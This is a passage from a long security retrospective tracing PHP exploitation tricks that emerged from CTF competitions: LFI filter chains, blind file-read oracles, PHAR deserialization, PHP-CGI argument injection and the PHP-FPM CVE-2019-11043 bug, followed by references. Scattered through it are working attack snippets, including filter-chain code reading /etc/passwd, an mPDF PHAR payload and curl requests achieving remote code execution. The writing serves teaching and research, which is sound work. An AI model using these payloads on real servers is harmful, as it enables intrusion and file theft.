hackers to start exploring built-in URL Protocols and Wrappers to bypass
such constraints. Some classic examples include:

 - [ `php://filter` Base64 in Piwik ] - [52]
 => In his bug, Stefan Esser pointed out that you could bypass
 content restrictions by abusing the loose Base64 decoding in the
 `php://filter` wrapper.

 - [ CODEGATE 2015: Owlur Challenge ] - [53]
 => the challenge leveraged the `zip://` wrapper to circumvent the
 fixed `.php` requirement.

=================================
| Level 0 - The LFI Arms Race |
=================================

When it comes to the LFI arms race, I guess we can start with my "One Line
PHP Challenge" [54]. While preparing for HITCON CTF 2018, I wanted to
bring the competition back to its basics - focusing purely on cool tricks
rather than stacking tedious tasks just to annoy participants. And that's
how "One Line PHP" was born:

------------------------[ One Line PHP Challenge
```



```
<?php
 ($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php' ?
 include($_) : highlight_file(__FILE__);
```



```
The whole idea behind the challenge came from a small upload-progress
feature that @Ryat mentioned in the comment of his SESSION Data Injection
report [55]. Inspired by that trick, I decided to blend it to LFI -
merging the two entirely different approaches we discussed earlier into
one single challenge!

I'd say "One Line PHP" turned out to be a successful CTF challenge. HITCON
CTF served as a qualifier for the "Hacker World Cup" DEFCON CTF that year,
drawing over 1800 teams worldwide, yet only three teams managed to crack
it. The challenge then also sparked a whole new trend to find more generic
ways to leave temporary files behind, and inspired numerous later CTF
challenges, including:
```



```
- 2018/12 - The Return of One Line PHP Challenge (RealWorld CTF Final)
 => [ By the way, I was sitting right there as a finalist, [56]
 watching (the return of) my challenge go live on stage! ]
 - 2019/12 - Includer (36C3 CTF) [57]
 - 2021/07 - 1linephp (0CTF/TCTF) [58]
 - 2021/10 - 2linephp (Balsn CTF) [59]
 - 2021/12 - Includer's Revenge (hxp CTF) [60]
```



```
If you're interested in the technical details behind them, I highly
recommend checking out the article "One Line PHP: From Genesis to
Ragnarok" [61], by @Ginoah and @Bookgin!

==============================
| Level 1 - The End of LFI |
==============================

As we've seen, up until a few years ago, the entire LFI scene was still
largely focused on finding more generic ways to plant temporary files. But
everything changed thanks to one wild idea from @loknop [62]. While he was
tackling the "includer's revenge," he started thinking: since we can
already manipulate file contents by `php://filter`, why not just chain
filters together to turn any file into a PHP backdoor?

In fact, his inspiration came from an unintended solution [63] discovered
by @gynvael. During Insomni'hack CTF 2018, @gynvael managed to find a way
to transform the `/flag` file into a viewable image by chaining multiple
PHP filters. Although the challenge at that time had nothing to do with
LFI - and the trick itself wasn't complicated at all - it unexpectedly
inspired @loknop several years later, becoming yet another unintended
solution in an LFI scene!

His idea mainly built around two PHP filters:

 - [ Removing ]: The `convert.base64-decode` filter is tolerant of its
 input, and "skips invalid characters."

 - [ Prepending ]: The `convert.iconv.CSISO2022KR` encoding "adds a
 fixed string" to the beginning.

By applying these two filters along with various encoding combinations, he
was ultimately able to insert arbitrary content at the very beginning of a
file - such as, prepending a letter `C`:
```



```
+-------------------------------------------+
| [Stage 1] Original File Content |
+-------------------------------------------+
| root:x:0:0:root:/root:/bin/bash [...] |
+---------------------+---------------------+
 | Prepend Charset Header
 v
+-------------------------------------------+
| [Stage 2] convert.iconv.UTF8.CSISO2022KR |
+-------------------------------------------+
| \x1B$)Croot:x:0:0:root:/root:/bin/bash |
+---------------------+---------------------+
 | Remove invalid Base64 chars
 v
+-------------------------------------------+
| [Stage 3] convert.base64-decode |
+-------------------------------------------+
| 0aba 28b7 | 1d34 ae8a | 2dfe ba28 | b7f6 |
+---------------------+---------------------+
 | Encoded result
 v
+-------------------------------------------+
| [Stage 4] convert.base64-encode |
+-------------------------------------------+
| *C*rootx00root/root/bin/bash [...] |
+-------------------------------------------+
```



```
Once @loknop fired the opening shot, the Infosec community started
actively filling in the remaining puzzle. First, @wupco quickly compiled a
complete Base64 mapping table [64]; then @remsio took a step further,
exploring how this technique could be leveraged in deserialization attacks
[65] along with a detailed writeup.

Thanks to these amazing hackers, exploiting LFI no longer requires any
actual "Local File" at all. Even if the entire filesystem is read-only, it
still can't stop a LFI from escalating into RCE. But what impressed me
most was that, while everyone else was still focusing on refining
temporary-file tricks, @loknop took a completely different approach -
diving deep into filter chains until he finally conquered this
long-standing problem. For that, I think he deserves some serious respect!

==============================
| Level 2 - The End of AFR |
==============================

And just when everyone thought solving one tough problem was impressive
enough, @hashkitten quickly took filter chains to another whole new level.
He created what might be the shortest PHP challenge ever:

-----------------------------[ minimal-php
```



```
<?php file($_POST[0]);
```



```
At first glance, you might think it's just a typical Arbitrary File Read
(AFR). But the real twist here was figuring out how to exploit it with no
output at all. Unsurprisingly, nobody managed to solve this challenge
during the competition. It wasn't until @hashkitten revealed his solution
[66] that everyone realized they needed to completely redefine what they
understood about filter chains.

The entire attack was built around another idea - since filter chains can
already *filter* the content (just like Base64 ignores invalid
characters), could there be any way to leak the result as well? Actually,
by intentionally hitting PHP's memory allocation limit, @hashkitten was
able to trigger an error! To demonstrate that his idea worked, he came up
with two brand-new filters:

 - [ Filtering ]: The `dechunk` filter removes an entire line if it
 doesn't start with hexadecimal.

 - [ Amplifying ]: The `convert.iconv.UCS-4LE` encoding expands the
 string length by four times.

So by first applying the `DECHUNK` filter, and then amplifying the result
over and over, you can turn PHP's behavior into a side-channel oracle - to
figure out whether the file's first character is within the valid
hexadecimal range or not!

+---------------------[ Use PHP Error as an Oracle!

=> [1] Preparing the Oracle filter chains...
```



```
$ cat check-first-char-is-hex.php
 <?php
 file(implode('|', [
 // [*] becomes empty if the first byte is not in hexdigits
 'php://filter/dechunk',

 // [*] repeat many times as needed
 'convert.iconv.L1.UCS-4LE',
 'convert.iconv.L1.UCS-4LE',
 'convert.iconv.L1.UCS-4LE',
 // [...]

 // [*] append the target
 'convert.iconv.L1.UCS-4LE/resource=' . $argv[1]
 ]));
```



```
=> [2] the first byte of `passwd` is not in hexdigits
```



```
$ php check-first-char-is-hex.php /etc/passwd
 PHP Fatal error: Allowed memory size of 134217728 bytes exhausted
 (tried to allocate 94371840 bytes) in [...]
```



```
=> [3] no error means the first byte of `hostname` is in hexdigits
```



```
$ php check-first-char-is-hex.php /etc/hostname && echo ok
 ok
```



```
Once the general idea took shape, the next step was building a complete
character-mapping table and iterating through the entire file byte by
byte. This process involved even more sophisticated filter tricks - such
as swapping byte order with different endianness, or fine-tuning encoding
combinations to get more precise results. Honestly, just looking at
@hashkitten's code gives me a headache; I can't imagine how much time he
spent grinding through this!

And once that barrier fell, the entire community jumped right in, pushing
this attack even further. First, @remsio released his own tool [67]. Then
@cfreal stepped up, not only adding custom suffixes [68], but also
sprinkling some serious magic [69] to perfect the attack. With all these
efforts combined, I think we can finally say we've conquered "Blind AFR"
once and for all in PHP!

============================================
| Level Max - Filter Chain ~After Story~ |
============================================

Aside from conquering LFI and Blind AFR, filter chains had a few more fun
twists. While experimenting with encoding combinations, @cfreal somehow
discovered a new memory corruption bug in the GNU C Library. He later
published a fantastic series of articles [70], detailing how to achieve
RCE with just a limited out-of-bounds write. And all these developments
eventually led the PHP community to consider "limiting the number of
Filter Chains" [71], effectively bringing the entire issue to a close.

Looking back at this twenty-year evolution of LFI - from the early days
when the Infosec community was all about finding better ways to control
file contents, to CTF players exploring generic methods to leave temporary
files behind, and finally to @loknop and @hashkitten shifting everyone's
attention back to PHP filters - this must be a truly epic journey, shaped
by the CTF, PHP, and Infosec communities all together!
```



```
As more and more people realized how dangerous deserialization could be,
developers became super cautious with `unserialize()`, causing such issues
to gradually fade away. But what if today, we could break the assumption
that "only `unserialize()` can trigger an attack?" Could we make
deserialization great again?

Well, I think "PHAR Deserialization" coming up next is probably the best
showcase: it can turn practically any file-related operation - whether
it's SSRF, XXE, or even SQL injection - straight back into a
deserialization attack! And I think I can proudly say that I was the first
person to bring this technique to the world (correct me if I'm wrong).
This technique originally appeared in my challenge at HITCON CTF 2017
[72]. However, it seems this trick stayed mostly within the CTF community
[73] and didn't really gain broader attention.

Of course, I know Sam Thomas also presented this attack surface [74] at
Black Hat USA 2018 (I was literally sitting in the audience right there!).
You wouldn't believe how shocked I was! We chatted a bit afterward and
realized we'd both independently discovered the same idea. Honestly, that
made me respect Thomas even more, because while I'd just used this trick
for fun in CTFs, he took it much further by exploring its real-world
impacts and successfully exploiting it in well-known projects like Typo3,
WordPress, and even TCPDF. It was Thomas who really put this trick on the
map, so please give him a big round of applause, too!

But anyway - please allow me to include "PHAR Deserialization" in this
section as well, and share the story!

=> I'd almost forgotten about this IRC log [75] XD
```



```
[13:14] <Beched> omg is this common knowledge? =)
[13:14] <Beched> where did you learn that PHP deserializes metadata in phars?
[13:14] <Beched> somehow no one knew that among us
[13:27] <orange_> I read the PHP source code in my free time
[13:27] <orange_> I think both tricks are not seen on the Internet
[13:27] <orange_> That's why nobody solve it ! :(
[13:38] <Beched> yeah that's cool
[13:38] <Beched> turning arbitrary read into unserialize
```



```
=============================
| Level 0 - What is PHAR? |
=============================

Just like JAR files in Java, "PHAR" is a PHP-specific archiving format
designed for easier deployment. While designing this format, PHP also
included a dedicated field to store the file's own metadata. And to make
sure deployed applications could easily access this information later on,
the metadata itself is also stored in a *serialized format* - which, as it
turns out, opened a whole new door for attackers.

So, how can we exploit this serialized field? Let's reuse the "Blind AFR"
from earlier, but this time we'll change the function from "reading a
file" to something even more restricted - checking if a file exists:

=> Try harder: Blind Arbitrary File-Check
```



```
<?php file_exists( $_GET['file'] );
```



```
At first glance, it might seem like filter chains could help again.
However, since `file_exists()` literally only checks if a file exists
without actually processing its content, you can't apply the previous
side-channel oracle here. But here's another twist - in order to
conveniently use PHAR files within PHP scripts, PHP introduced the
`phar://` built-in wrapper back in PHP 5.3. And whenever PHP parses a PHAR
file with this protocol, it automatically deserializes the metadata stored
inside. This means nearly every file operation in PHP could potentially
become another entry point for deserialization!

As for exactly how we can escalate this from PHAR deserialization all the
way to remote code execution, there are still some practical challenges to
overcome - such as figuring out how to deliver a malicious PHAR file onto
the remote server. (Perhaps our efforts in the LFI Arms Race weren't
wasted after all!) This heavily requires the attacker's creativity and
their familiarity with the target environment. I believe Thomas already
showed an impressive RCE in TCPDF during his talk. Here, I'd like to
introduce another brilliant case involving mPDF!

==============================================
| Level Max - Laravel (w/ mPDF) Kill Chain |
==============================================

Just like TCPDF, mPDF is another widely used library when you need to
convert HTML into PDFs. And during the conversion process, mPDF performs
file operations on image URLs as well - meaning attackers can easily reuse
the same technique to trigger PHAR deserialization:

----------------------------[ So PHAR so Good!
```



```
<img src="phar://path/to/image.jpg" />
```



```
The issue was first discovered [76] back in 2019 and promptly got patched.
However, @Cyku quickly found another way to trigger the vulnerability and
provided a full exploit [77] based on a real-world scenario! He also
discovered that mPDF actually caches embedded Data URIs onto the remote
filesystem. By exploiting the predictable randomness of the cached
filenames, he was able to smuggle a crafted PHAR file - then combine it
with Laravel's built-in POP chains - to finally achieve RCE!

------------------------[ Exploit mPDF All in One!
```



```
<style>
 background: url(data:image/jpeg;base64,HERE-IS-PHAR-PAYLOAD-IN-BASE64);
 </style>

 <img src="#" ORIG_SRC="phar:///tmp/mpdf/_tempCSSidata42_0.jpeg/a.jpg"/>
```



```
The entire PHAR mechanism really opened up a whole new era of PHP
deserialization attacks. As more researchers got involved, this attack
surface gradually expanded to cover more applications, libraries, and even
PHP frameworks. Ultimately, this forced the PHP team to disable automatic
deserialization in the PHAR protocol starting from PHP 8.0 [78]. I'm sure
that was fantastic news for both Thomas and me - because it meant that our
"security research" actually did something positive in the real world, and
made PHP a little bit safer! :)
```



```
When we talk about "an awesome CTF," I'm not sure which name immediately
pops into your mind. In my opinion, while high-quality challenges and
experienced organizers are important, it's the participants themselves who
truly make a CTF awesome.

I believe we've already shown how the CTF community works: participants
not only learn new tricks straight from challenge authors, but authors
themselves can also discover their own blind spots through unintended
solutions. Both sides push each other forward, working together to advance
the entire Infosec community!

But sometimes, this kind of interaction can get a bit "out of hand." We've
seen plenty of cases where the unintended solutions submitted by CTF
players turned out to be actual 0days - that happened repeatedly in
Chromium [79], VirtualBox [80], and even CS:GO [81]. Sometimes, even the
CTF authors expect players to solve the challenges using unknown 0days. As
far as I know, certain CTFs also have a special "Zajebiste" category,
specifically for these challenges involving 0days or something very close
to it!

So, in this section, let me introduce two classic examples that you
shouldn't miss when talking about PHP 0days born in CTFs!
```



```
Whenever I talk to people outside the Infosec community about hacking
competitions, they often jokingly say, "Come on, real hackers wouldn't
follow the rules - they'd just hack and change their scores, right?" Well,
to be fair, they're actually right! There's indeed plenty of history where
scoreboards got hacked (and to be honest, I've contributed a few myself).
But if we're talking about the most legendary case, I'd say it's
definitely the PHP-CGI 0day discovered by Eindbazen team - right there on
a CTF scoreboard [82]!

During Nullcon HackIM CTF, the organizers directly used a CGI environment
provided by their web hosting provider. Since the CGI-spec itself is
inherently vulnerable to argument injection by design, it became even more
unfortunate (or fortunate - choose your side) when PHP developers forgot
about this and completely removed the defensive logic. These coincidences
combined allowed Eindbazen team to control PHP's command-line arguments
directly through the query string. For example, they can simply append a
`?-s` at the end of the URL to leak any PHP source code on the remote
server - and escalating it further into full RCE is just as trivial!

This vulnerability impacted a huge number of websites back then -
especially those web hosting providers heavily relying on CGI for
privilege isolation and PHP version switching. And because this
vulnerability was so ridiculously easy to exploit, it quickly became
notorious worldwide. Even Facebook - famous for its PHP-based
infrastructure at the time - put an Easter egg right on its homepage
(linking the URL to their security engineer recruitment page) to
acknowledge this vulnerability, too!

----------------------[ Easter Egg on facebook.com!
```



```
$ curl https://www.facebook.com/?-s
 <?php
 include_once 'https://www.facebook.com/careers/department?dept=engineering&req=a2KA0000000Lt8LMAS';
```



```
This vulnerability was eventually patched and assigned CVE-2012-1823. The
PHP team solved this issue by checking that the query string can't start
with a hyphen `-` (0x2D). This fix kept PHP safe for about 12 years -
until I broke it again last year.

=> The patch of CVE-2012-1823: PHP-CGI Argument Injection
```



```
if((qs = getenv("QUERY_STRING")) != NULL && strchr(qs, '=') == NULL) {
 /* ... omitted ... */
 for (p = decoded_qs; *p && *p <= ' '; p++) {/* skip leading spaces */}
 if (*p == '-') {
 skip_getopt = 1;
 }
```



```
While revisiting PHP's source code, I found that by leveraging the Windows
"BestFit" feature, I could completely bypass this fix. "BestFit" is
basically a backward-compatibility feature introduced by Windows. It tries
to minimize garbled characters through a series of weird character
mappings when dealing with older ANSI APIs (thanks a lot, Microsoft). This
mechanism also came with some strange side effects - for example, you can
use the infinity symbol `∞` (U+221E) to represent the digit `8` (U+0038)
right on the command line:

=> Microsoft maps the characters to their "lookalikes"
```



```
C:\Users\Orange> type Hello.c
 int main(int argc, char* argv[], char* envp[]) {
 printf("Hello %s!\n", argv[1]);
 }

C:\Users\Orange> cl.exe Hello.c
 Microsoft (R) C/C++ Optimizing Compiler Version 19.29.30140 for x64
 Copyright (C) Microsoft Corporation. All rights reserved.
 [...]

C:\Users\Orange> Hello.exe World
 Hello World!

C:\Users\Orange> Hello.exe √π⁷≤∞
 Hello vp7=8!
```



```
So, by simply replacing the originally blocked hyphen (0x2D) with a "soft
hyphen" (0xAD), the original attack could be revived effortlessly! This
bypass affects practically every PHP version running on Windows - even a
default XAMPP installation was vulnerable. This vulnerability has also
earned its CVE number (CVE-2024-4577). If you're curious about the
technical details behind it, you should definitely check out WorstFit
Attack [46] - a joint work with the brilliant @splitline!

I think this bypass also echoes what we mentioned earlier about
"cross-application" - security is never confined to just one dimension.
Sometimes, shifting your perspective a bit can magically turn those
seemingly rock-solid protections into just a piece of cake! ;)
```



```
For a long time, CTFs have carried a kind of *original sin* - being
criticized for putting too much emphasis on tricky techniques. As the
technical bar kept rising, some challenges grew a bit overly contrived,
giving people the impression that CTFs were becoming "disconnected from
reality." That's exactly what gave birth to competitions like Real World
CTF - aiming to ground every challenge in real-world applications and
bring focus back to practical, realistic hacking scenarios!

At Real World CTF 2019, the organizers set up a challenge using Nginx +
PHP, expecting players to bypass the built-in XSS Auditor in the latest
Chrome and steal the admin's cookie. Obviously, this was a challenge
focusing on frontend security - but while messing around with the server,
@d90pwn noticed something unusual happening on the backend. Specifically,
he found that if the URL contained a newline, the server would
unexpectedly respond with additional internal information.

--------------------------[ PHP-FPM is Bleeding?
```



```
$ curl http://orange.local/test.php/AAAAAAAAA
 string(10) "/AAAAAAAAA"

$ curl http://orange.local/test.php/AAAAA%0AB
 string(7) "TH_INFO" <= WTF!?
```



```
Although @d90pwn didn't manage to crack this challenge during the
competition, his post-event analysis (along with @neex and @beched)
unexpectedly exposed a serious vulnerability in PHP-FPM. The entire issue
started from an unintended behavior in Nginx - while processing URLs
containing newline characters, Nginx mistakenly passed an empty
`PATH_INFO` to the backend PHP-FPM. Meanwhile, PHP-FPM always assumed that
value could never be empty, causing its internal logic to miscalculate the
offset. This mistake unintentionally caused the `path_info` to point just
before its intended buffer - allowing attackers to eventually write a zero
to that location!

=> CVE-2019-11043: A Buffer Underflow leads to a single NULL-byte write!
```



```
char *env_path_info = FCGI_GETENV(request, "PATH_INFO");
int pilen = env_path_info ? strlen(env_path_info) : 0;

if (apache_was_here) {
 path_info = script_path_translated + ptlen;
} else {
 // [1] `path_info` *UNDERFLOWS*, pointing before its intended buffer
 path_info = env_path_info ? env_path_info + pilen - slen : NULL;
}

old = path_info[0];
path_info[0] = 0; // <--- [2] single NULL-byte write!
```



```
But how could a single NULL-byte write lead to an RCE? Here's the
ingenious part: @neex skillfully abused PHP-FPM's memory allocation for
CGI variables. By overwriting the LSB (least significant bit) of the `pos`
field in the internal structure to `0`, he was able to overwrite existing
variable contents on the subsequent write. Combined with some Hash Table
magic, he successfully crafted a pure data-only attack - achieving full
RCE without any memory read/write primitives at all!

+---------------------[ Exploit PHP-FPM Like a Boss!
=> [1] a minified payload to trigger the NULL-byte write!
```



```
$ curl http://orange.local/index.php/%0A$(printf %032d)?$(printf %01759d)

[...Switching to GDB]

Breakpoint 1, init_request_info () at ./sapi/fpm/fpm/fpm_main.c:1222
 1222 path_info[0] = 0;
 1: /x path_info = 0x55a371abfd60
 2: /x request.env.data = 0x55a371abfd60
```



```
=> [2] the structure *BEFORE* the write
```



```
(gdb) p *request.env.data

 $1 = {
 pos = 0x55a371abf731,
 end = 0x55a371ac06b8,
 next = 0x55a371abe5b0,
 data = ""
 }
```



```
=> [3] let's write!
```



```
(gdb) next

 [...]
```



```
=> [4] the `pos` *AFTER* the write
```



```
(gdb) p *request.env.data.pos

 $2 = 0x55a371abf700
```



```
=> [5] let's kick off the real payload
```



```
$ curl "http://orange.local/index.php/PHP_VALUE%0Aerror_log=/tmp/a;;;;[..]"
$ curl "http://orange.local/index.php/PHP_VALUE%0Ainclude_path=/tmp;;;[..]"
$ curl "http://orange.local/index.php/PHP_VALUE%0Aauto_prepend_file=a;[..]"
 [...]
$ curl "http://orange.local/index.php?a=id"
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



```
The entire exploit [83] was incredibly neat and packed with details.
Looking back through PHP's history, it's extremely rare to find RCE cases
without any dangerous PHP functions at all - making this another true
classic in PHP history!

On top of that, the bug itself was incredibly hard to uncover through
traditional fuzzing. It required not only leveraging a specific edge-case
under Nginx, but also PHP's contiguous memory allocations, which made it
harder for tools like ASAN to detect. Without something like the CTF scene
- where groups of hackers intensively examine a minor feature through
trial and error - it's hard to imagine how long this bug might have stayed
hidden!
```



```
Honestly, tackling such a huge topic was incredibly challenging -
especially deciding what to cover and worrying whether I'd missed even
cooler stories. Every time I revisited a finished section, I still felt
something was missing, and ended up rewriting the whole thing from scratch
again. The entire process involved countless revisions, and there were so
many moments I nearly gave up - but thankfully, I made it through in the
end! I'd also like to give special thanks to Henry Huang and Raptor for
polishing this article and giving numerous awesome suggestions - thank you
so much!

Though this article revisits tons of seemingly old techniques, I think
it's meaningful - they may be old, but they're absolute gold (and still
usable today)! It's just like you can't avoid studying the Vudo Tricks
[84] while learning Doug Lea's malloc, or revisiting the textbook-level
Smashing The Stack [85]. These techniques became legendary exactly because
the ideas behind them were way ahead of their time, inspiring generations
of hackers along the way!

Of course, I believe there must be even better ways to explore this topic.
Everyone brings their own life experiences, and writing with complete
objectivity just isn't possible. But within the limited time and space,
I've tried my best to capture my own "flavor," and highlight the stories
that I believe deserve to be passed on!
```



```
Of course, there are still lots of brilliant PHP techniques that I
couldn't squeeze into this article, so let me at least quickly give them a
*shout-out* here!

 - I absolutely love the "PHP Security Advent Calendar" [86] released
 by RipsTech - every single challenge in there is pure gold!

 - Exploiting GMP deserialization type confusion [87] to modify
 script-level variables through `objects_store` is, in my opinion, a
 perfect blend of the Web and Binary worlds!

 - Leveraging type confusion in `phpinfo()` to steal SSL private keys
 [88] is quite fun.

 - Exploiting inconsistent UTF-8 length counting [89] is definitely an
 eye-opening technique!

 - Attacking the MySQL client-side is another fascinating approach -
 such as triggering memory corruption [90] via a malicious MySQL
 server, or leveraging PHAR deserialization [91] again.

 - All those creative tricks for restricted environment jailbreaks,
 like abusing `ini_set()` [92] or `imap_open()` [93].

 - And of course, so much more...
```



```
From its beginnings as a kind of subculture, to having thousands of
competitions worldwide, and even one-vs-one livestream battles [94] today,
CTF has undoubtedly become something pretty cool for many young hackers.
Of course, CTF itself has some issues that get criticized from time to
time - so even if you never play CTFs, that doesn't mean you can't be a
great hacker. And things aren't always black-and-white: whether it's
Binary Golfers [95] crafting ever-more elegant code, gamers using ACE
(Arbitrary Code Execution) to speedrun straight to the game credits [96],
or even pulling off remote code execution on a 25-year-old Game Boy Color
[97] - it's exactly because these challenges themselves are so fascinating
that they draw more people in, pushing technologies and skills to their
absolute limits!

I believe every generation has its own legendary stories. Whether it's
"taking over the organizer's crypto backdoor," anonymous fork bombs,
horrible-yet-effective binary patches, or those CTF dramas; whether it's
ingenious techniques born in CTFs, like Eye-Grepping binaries [98], the
dozens of "House of" techniques, or the insane arms race in frontend
security; or those hilarious stories and urban legends - like DDTEK's
obsession with sheep, observing tomcr00se up close, or even *accidentally*
hacking into another team's laptop... Just like the amazing stories shared
by @psifertex [99], I'm sure there must be more - I'm really looking
forward to seeing more people step up and share their own epic CTF
adventures! :)

Also, hats off to those who've shared all the ups and downs throughout my
CTF journey - cheers to HITCON CTF and to 217!
```



```
[1] Orange Tsai, https://blog.orange.tw/about/

 [2] "2021 Top Routinely Exploited Vulnerabilities"
 https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-117a

 [3] "SECCON CTF 2014: QR (Easy) Write-up"
 https://yous.be/2014/12/07/seccon-ctf-2014-qr-easy-write-up/

 [4] Lays, "Google CTF Final 2017 - Slot Machine"
 https://blog.l4ys.tw/blog/google-ctf-final-2017-slotmachine

 [5] Matt Borgerson (The Order of the Overflow)
 "Port of the classic [FPS] DOOM to Xbox for DEFCON 27 CTF"
 https://github.com/mborgerson/dc27-dooom

 [6] Lightning (Legitimate Business Syndicate), "cLEMENCy - Showing Mercy"
 https://blog.legitbs.net/2017/10/clemency-showing-mercy.html

 [7] Mateusz "j00ru" Jurczyk, Gynvael Coldwind
 "Pwning (sometimes) with style Dragons' notes on CTFs"
 https://j00ru.vexillium.org/slides/2015/insomnihack.pdf#page=34

 [8] Julien "jvoisin" Voisin
 "Paper notes: return-to-csu: A New Method to Bypass 64-bit Linux ASLR"
 https://dustri.org/b/paper-notes-return-to-csu-a-new-method-to-bypass-
 64-bit-linux-aslr.html

 [9] Angelboy, "HITCON CTF Qual 2016 - House of Orange Write up"
 https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-
 orange.html

[10] lollersk8ers, "Buffer overflow in handling of UNIX socket addresses"
 https://www.freebsd.org/security/advisories/FreeBSD-SA-11:05.unix.asc

[11] Jerry "pzread" Wu, "天衣無縫 ~ Fantastic Seamless Textile ~"
 https://gist.github.com/pzread/2ae0bb3aa5fe0dc69fcf3257c41db944

[12] david942j, "The elf in ELF - use 0-day(s) to cheat all disassemblers"
 https://hitcon.org/2018/CMT/slide-files/d2_s1_r1.pdf

[13] "The Month of PHP Security"
 https://www.php-security.org/ (archived)

[14] "Php Codz Hacking", https://github.com/80vul/phpcodz

[15] Adam Iwaniuk
 "Overriding $ FILES array during uploading multiple files in php"
 https://students.mimuw.edu.pl/~ai292615/php_multipleupload_
 overwrite.pdf (archived)

[16] "PHP Object Instantiation issues in HumHub (CVE-2015-1033)"
 https://www.midnightblue.nl/blog/cve-2015-1033-humhub-
 php-object-instantiation-issues

[17] Arseniy Sharoglazov, "Exploiting Arbitrary Object Instantiations in
 PHP without Custom Classes", https://swarm.ptsecurity.com/
 exploiting-arbitrary-object-instantiations/

[18] Andrew, "Format String Vulnerability in Class Name Error Message"
 https://bugs.php.net/bug.php?id=71105

[19] Alexander "alech" Klink, Julian "zeri" Wälde, "Efficient Denial of
 Service Attacks on Web Application Platforms",
 https://fahrplan.events.ccc.de/congress/2011/Fahrplan/attachments/
 2007_28C3_Effective_DoS_on_web_application_platforms.pdf

[20] Philippe "pilvar" Dourassov, "Secret Web Hacking Knowledge - CTF
 authors hate these simple tricks", https://download.scrt.ch/
 insomnihack/ins24-slides/Secret_web_hacking_knowledge.pdf?page=144

[21] Dustin Schultz, "Critical PHP Remote Vulnerability Introduced in Fix
 for PHP Hashtable Collision DOS", http://thexploit.com/sec/critical-
 php-remote-vulnerability-introduced-in-fix-for-php-hashtable-
 collision-dos/ (archived)

[22] Simon Scannell, "WordPress < 5.8.3 - Object Injection Vulnerability"
 https://www.sonarsource.com/blog/wordpress-object-injection-
 vulnerability/

[23] Stefan Esser, "MySQL and SQL Column Truncation Vulnerabilities"
 http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-
 vulnerabilities/ (archived)

[24] Tom Van Goethem, "WordPress < 3.6.1 PHP Object Injection"
 https://tom.vg/2013/09/wordpress-php-object-injection/

[25] "0CTF 2016 Quals / piapiapia", https://ctftime.org/task/2130

[26] Slavco Mihajloski, "Wordpress SQLi"
 https://medium.com/websec/wordpress-sqli-bbb2afcc8e94 (archived)

[27] Karim El Ouerghemmi, Slavco Mihajloski
 "Privilege Escalation in 2.3M WooCommerce Shops"
 https://blog.ripstech.com/2018/woocommerce-php-object-
 injection/ (archived)

[28] Alessandro "kiks" Groppo, "Rusty Joomla Remote Code Execution"
 https://1day.dev/notes/Rusty-Joomla-Remote-Code-Execution/

[29] Taoguang "Ryat" Chen, "Create an Unexpected Object and Don't Invoke
 __wakeup() in Deserialization", https://bugs.php.net/bug.php?id=72663

[30] Paul Axe, "WCTF 2019 / P Door"
 https://github.com/paul-axe/ctf/blob/master/wctf2019/p-door/p-door.pdf

[31] inhann, "A new way to bypass __wakeup() and build POP chain"
 https://inhann.top/2022/05/17/bypass_wakeup/

[32] "PHPGGC", https://github.com/ambionics/phpggc

[33] Arseniy "Raz0r" Reutov, "CONFidence 2013: PHP Object Injection
 Revisited", https://raz0r.name/talks/confidence-2013-php-
 object-injection-revisited/

[34] Dario "haxonaut" Weißer, cutz, Ruslan "evonide" Habalov
 "How we broke PHP, hacked Pornhub and earned $20,000"
 https://www.evonide.com/how-we-broke-php-hacked-pornhub-
 and-earned-20000-dollar/

[35] Stefan Esser, "State of the Art Post Exploitation in Hardened PHP
 Environments", https://www.blackhat.com/presentations/bh-usa-09/ESSER/
 BHUSA09-Esser-PostExploitationPHP-SLIDES.pdf

[36] Taoguang "Ryat" Chen, "Use after free vulnerability in unserialize()
 with DateTimeZone", https://bugs.php.net/bug.php?id=68942

[37] Orange Tsai, "A Journey Combining Web Hacking and Binary Exploitation
 in Real World!", https://blog.orange.tw/posts/2021-02-
 a-journey-combining-web-and-binary-exploitation/

[38] "HTTPoxy", https://httpoxy.org/

[39] Joshua Maddux, "TLS Poison", https://github.com/jmdx/TLS-poison/

[40] Charles "cfreal" Fol, "Laravel <= v8.4.2 debug mode: Remote code
 execution", https://blog.lexfo.fr/laravel-debug-rce.html

[41] Giovanni "evilaliv3" Pellerano, Antonio "s4tan" Parata, Francesco
 "ascii" Ongaro, Alessandro "jekil" Tanasi, "PHP filesystem attack
 vectors - Take Two"
 https://www.ush.it/2009/07/26/php-filesystem-attack-vectors-take-two/

[42] Vladimir Vorontsov, Arthur Gerkis, "Oddities of PHP file access in
 Windows", http://onsec.ru/onsec.whitepaper-02.eng.pdf (archived)

[43] "PHPCMSv9逻辑漏洞导致备份文件名可猜测"
 https://mp.weixin.qq.com/s?__biz=MzIxNjkwODg4OQ==&mid=2247483837&
 idx=1&sn=6f448a26d079bfa379c627e32f4fc321

[44] "解决DEDECMS历史难题--找后台目录", https://xz.aliyun.com/news/1765

[45] Soroush "irsdl" Dalili
 "A Dotty Salty Directory: A Secret Place in NTFS for Secret Files!"
 https://soroush.me/blog/2010/12/a-dotty-salty-directory-a-secret-
 place-in-ntfs-for-secret-files/

[46] Orange Tsai, Splitline NG
 "WorstFit: Unveiling Hidden Transformers in Windows ANSI!"
 https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-
 transformers-in-windows-ansi/

[47] Ryo "icchy" Ichikawa, "WCTF2019: Gyotaku The Flag"
 https://github.com/icchy/wctf2019-gtf/blob/master/
 wctf2019-gtf-slides.pdf

[48] "BELLUMINAR", http://belluminar.org/

[49] Orange Tsai, "Breaking Parser Logic! Take Your Path Normalization Off
 and Pop 0days Out", https://i.blackhat.com/us-18/Wed-August-8/us-
 18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-
 Off-And-Pop-0days-Out-2.pdf#page=48

[50] Gynvael Coldwind, "PHP LFI to arbitratry code execution via rfc1867
 file upload temporary files", https://gynvael.coldwind.pl/download.
 php?f=PHP_LFI_rfc1867_temporary_files.pdf

[51] Brett Moore, "LFI WITH PHPINFO() ASSISTANCE"
 https://insomniasec.com/downloads/publications/
 LFI%20With%20PHPInfo%20Assistance.pdf

[52] Stefan Esser, "Piwik Cookie unserialize() Vulnerability"
 https://seclists.org/fulldisclosure/2009/Dec/204

